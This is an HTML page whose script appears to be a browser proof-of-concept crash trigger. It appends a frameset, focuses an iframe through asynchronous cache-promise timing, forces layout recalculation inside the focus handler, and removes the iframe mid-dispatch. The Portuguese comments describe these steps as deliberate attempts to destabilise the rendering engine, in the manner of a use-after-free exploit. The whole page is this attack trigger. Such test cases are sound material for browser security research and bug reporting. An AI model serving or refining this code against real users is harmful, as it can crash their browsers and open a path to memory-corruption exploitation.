
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<style>
  iframe {
    content: url();
    zoom: 0.01;
    width: 10px;
    height: 10px;
  }
</style>
</head>
<body>

<iframe id="i0"></iframe>

<script>
  window.addEventListener('load', () => {
    const i0 = document.getElementById('i0');

    // 1. Dispara o frameset no documento raiz
    document.documentElement.append(document.createElement('frameset'));

    // 2. Manipula o evento de foco com forçamento imediato de layout
    i0.onfocus = () => {
      location.hash = 'y';

      // Força a engine a recalcular estilo e layout no meio do dispatch de eventos
      try {
        void document.body.offsetHeight;
        void i0.contentWindow.document.body.offsetHeight;
      } catch (e) {}

      // Tenta desanexar/remover o nó do iframe durante o processamento do widget
      try {
        i0.remove();
      } catch (e) {}
    };

    location.hash = 'x';

    // 3. Timing de microrotas assíncronas
    if (window.caches) {
      caches.has('a').then(() => {
        i0.focus();
        // Layout thrashing síncrono logo após o foco
        void document.documentElement.offsetHeight;
      });
    } else {
      setTimeout(() => {
        i0.focus();
        void document.documentElement.offsetHeight;
      }, 0);
    }
  });
</script>
</body>
</html>
